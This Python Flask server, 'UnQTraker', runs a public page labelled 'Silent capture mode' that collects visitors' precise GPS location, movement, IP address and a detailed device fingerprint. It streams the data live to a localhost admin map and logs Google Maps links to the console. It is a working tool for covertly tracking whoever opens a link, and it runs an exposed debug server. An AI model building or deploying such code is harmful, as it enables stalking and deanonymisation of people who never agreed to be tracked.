#!/usr/bin/env python3
"""
UnQTraker - Advanced Location Intelligence System
Real-time location tracking with live updates
Built with ❤️ by Sandeep Gaddam
"""

from flask import Flask, render_template, request, jsonify, abort
from flask_socketio import SocketIO, emit
from datetime import datetime
import json
import os
from pathlib import Path
import uuid

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)
app.config['JSON_AS_ASCII'] = False

# Initialize Socket.IO for real-time updates
socketio = SocketIO(app, cors_allowed_origins="*")

# Storage directory for location data
DATA_DIR = Path('data')
DATA_DIR.mkdir(exist_ok=True)
LOCATIONS_FILE = DATA_DIR / 'locations.json'
SESSIONS_FILE = DATA_DIR / 'sessions.json'

def load_locations():
    """Load location data from JSON file"""
    if LOCATIONS_FILE.exists():
        try:
            with open(LOCATIONS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return []
    return []

def save_location(data):
    """Save location data to JSON file"""
    locations = load_locations()
    locations.append(data)
    
    # Keep only last 500 locations for comprehensive history
    if len(locations) > 500:
        locations = locations[-500:]
    
    with open(LOCATIONS_FILE, 'w', encoding='utf-8') as f:
        json.dump(locations, f, indent=2, ensure_ascii=False)
    
    return data

def load_sessions():
    """Load active sessions"""
    if SESSIONS_FILE.exists():
        try:
            with open(SESSIONS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_session(session_id, data):
    """Save session information"""
    sessions = load_sessions()
    sessions[session_id] = data
    
    with open(SESSIONS_FILE, 'w', encoding='utf-8') as f:
        json.dump(sessions, f, indent=2, ensure_ascii=False)

def is_localhost(request):
    """Check if request is from localhost"""
    remote_addr = request.remote_addr
    allowed_hosts = ['127.0.0.1', 'localhost', '::1']
    return remote_addr in allowed_hosts

@app.route('/')
def index():
    """Main tracking page - Silent capture mode"""
    return render_template('index.html')

@app.route('/admin')
def admin():
    """Admin dashboard with real-time map - localhost only"""
    if not is_localhost(request):
        abort(403)
    
    locations = load_locations()
    sessions = load_sessions()
    return render_template('admin.html', locations=locations, sessions=sessions)

@app.route('/api/location', methods=['POST'])
def receive_location():
    """API endpoint to receive location data and broadcast real-time updates"""
    try:
        data = request.get_json()
        
        # Generate or use existing session ID
        session_id = data.get('session_id') or str(uuid.uuid4())
        
        # Extract comprehensive location and device data
        location_data = {
            'id': str(uuid.uuid4()),
            'timestamp': datetime.now().isoformat(),
            'latitude': data.get('latitude'),
            'longitude': data.get('longitude'),
            'accuracy': data.get('accuracy'),
            'altitude': data.get('altitude'),
            'altitude_accuracy': data.get('altitudeAccuracy'),
            'heading': data.get('heading'),
            'speed': data.get('speed'),
            'device_info': {
                'user_agent': request.headers.get('User-Agent'),
                'ip_address': request.remote_addr,
                'browser': data.get('browser'),
                'browser_version': data.get('browser_version'),
                'os': data.get('os'),
                'os_version': data.get('os_version'),
                'device_type': data.get('device_type'),
                'device_vendor': data.get('device_vendor'),
                'device_model': data.get('device_model'),
                'screen_width': data.get('screen_width'),
                'screen_height': data.get('screen_height'),
                'screen_resolution': data.get('screen_resolution'),
                'color_depth': data.get('color_depth'),
                'pixel_ratio': data.get('pixel_ratio'),
                'language': data.get('language'),
                'languages': data.get('languages'),
                'timezone': data.get('timezone'),
                'timezone_offset': data.get('timezone_offset'),
                'platform': data.get('platform'),
                'cookie_enabled': data.get('cookie_enabled'),
                'online_status': data.get('online_status'),
                'connection_type': data.get('connection_type'),
                'battery_level': data.get('battery_level'),
                'battery_charging': data.get('battery_charging'),
                'referrer': request.headers.get('Referer', 'Direct'),
                'touch_support': data.get('touch_support'),
                'cores': data.get('cores'),
                'memory': data.get('memory')
            },
            'session_id': session_id,
            'is_live': data.get('is_live', False)
        }
        
        # Save to file
        saved_data = save_location(location_data)
        
        # Update session info
        session_info = {
            'session_id': session_id,
            'first_seen': data.get('first_seen', datetime.now().isoformat()),
            'last_seen': datetime.now().isoformat(),
            'location_count': len([loc for loc in load_locations() if loc.get('session_id') == session_id]),
            'device_info': location_data['device_info'],
            'is_live_tracking': data.get('is_live', False)
        }
        save_session(session_id, session_info)
        
        # Broadcast real-time update to all connected admin clients via Socket.IO
        socketio.emit('location_update', {
            'location': location_data,
            'session': session_info
        }, namespace='/')
        
        # Enhanced console logging
        live_indicator = "🔴 LIVE" if location_data['is_live'] else "📍"
        print(f"\n{'='*70}")
        print(f"{live_indicator} UNQTRAKER - LOCATION UPDATE")
        print(f"{'='*70}")
        print(f"🆔 Session: {session_id[:8]}...")
        print(f"⏰ Time: {location_data['timestamp']}")
        print(f"🌍 Location: {location_data['latitude']:.6f}, {location_data['longitude']:.6f}")
        print(f"🎯 Accuracy: {location_data['accuracy']}m")
        print(f"📱 Device: {location_data['device_info']['device_type']} - {location_data['device_info']['os']}")
        print(f"💻 Browser: {location_data['device_info']['browser']} {location_data['device_info']['browser_version']}")
        print(f"📶 IP: {location_data['device_info']['ip_address']}")
        
        if location_data['device_info']['battery_level']:
            print(f"🔋 Battery: {location_data['device_info']['battery_level']}% {'⚡' if location_data['device_info']['battery_charging'] else '🪫'}")
        
        print(f"🗺️  Maps: https://www.google.com/maps?q={location_data['latitude']},{location_data['longitude']}")
        print(f"{'='*70}\n")
        
        return jsonify({
            'status': 'success',
            'message': 'Location tracked successfully',
            'session_id': session_id,
            'data': saved_data
        }), 200
        
    except Exception as e:
        print(f"❌ Error receiving location: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 400

@app.route('/api/locations', methods=['GET'])
def get_locations():
    """API endpoint to retrieve all stored locations - localhost only"""
    if not is_localhost(request):
        abort(403)
    
    session_id = request.args.get('session_id')
    locations = load_locations()
    
    if session_id:
        locations = [loc for loc in locations if loc.get('session_id') == session_id]
    
    return jsonify({
        'status': 'success',
        'count': len(locations),
        'locations': locations
    })

@app.route('/api/sessions', methods=['GET'])
def get_sessions():
    """API endpoint to get all active sessions - localhost only"""
    if not is_localhost(request):
        abort(403)
    
    sessions = load_sessions()
    return jsonify({
        'status': 'success',
        'count': len(sessions),
        'sessions': sessions
    })

@app.route('/api/latest', methods=['GET'])
def get_latest():
    """API endpoint to get the latest location - localhost only"""
    if not is_localhost(request):
        abort(403)
        
    locations = load_locations()
    if locations:
        return jsonify({
            'status': 'success',
            'location': locations[-1]
        })
    return jsonify({
        'status': 'error',
        'message': 'No locations found'
    }), 404

@app.route('/api/stats', methods=['GET'])
def get_stats():
    """API endpoint for statistics - localhost only"""
    if not is_localhost(request):
        abort(403)
        
    locations = load_locations()
    sessions = load_sessions()
    
    if not locations:
        return jsonify({
            'status': 'success',
            'total_locations': 0,
            'total_sessions': 0,
            'unique_ips': 0,
            'active_sessions': 0
        })
    
    unique_ips = len(set(loc['device_info']['ip_address'] for loc in locations if loc.get('device_info', {}).get('ip_address')))
    active_sessions = len([s for s in sessions.values() if s.get('is_live_tracking')])
    
    return jsonify({
        'status': 'success',
        'total_locations': len(locations),
        'total_sessions': len(sessions),
        'unique_ips': unique_ips,
        'active_sessions': active_sessions,
        'latest_timestamp': locations[-1]['timestamp'] if locations else None
    })

@app.route('/health')
def health():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'app': 'UnQTraker',
        'version': '3.0',
        'timestamp': datetime.now().isoformat(),
        'total_locations': len(load_locations()),
        'active_sessions': len(load_sessions()),
        'developer': 'Sandeep Gaddam'
    })

@socketio.on('connect')
def handle_connect():
    """Handle client connection"""
    print(f"✅ Admin connected: {request.sid}")
    emit('connection_status', {'status': 'connected', 'message': 'Real-time tracking active'})

@socketio.on('disconnect')
def handle_disconnect():
    """Handle client disconnection"""
    print(f"❌ Admin disconnected: {request.sid}")

@app.errorhandler(403)
def forbidden(e):
    """Custom 403 error handler"""
    return jsonify({
        'error': 'Access Denied',
        'message': 'This resource is only accessible from localhost'
    }), 403

if __name__ == '__main__':
    print("\n" + "="*70)
    print("🚀 UNQTRAKER - Advanced Location Intelligence System")
    print("="*70)
    print("📍 Real-time location tracking server is running")
    print("🌐 Public tracker: http://localhost:5000")
    print("👨‍💼 Admin dashboard: http://localhost:5000/admin (localhost only)")
    print("")
    print("📊 API Endpoints (localhost only):")
    print("   - POST /api/location - Receive location data")
    print("   - GET  /api/locations - Get all locations")
    print("   - GET  /api/sessions - Get all sessions")
    print("   - GET  /api/latest - Get latest location")
    print("   - GET  /api/stats - Get statistics")
    print("")
    print("🔴 Real-time Features:")
    print("   - Live location tracking with Socket.IO")
    print("   - Auto-update on location capture")
    print("   - Interactive map interface")
    print("")
    print("🔒 Security: Admin access restricted to localhost only")
    print("👨‍💻 Built with ❤️ by Sandeep Gaddam")
    print("="*70 + "\n")
    
    socketio.run(app, host='0.0.0.0', port=5000, debug=True, allow_unsafe_werkzeug=True)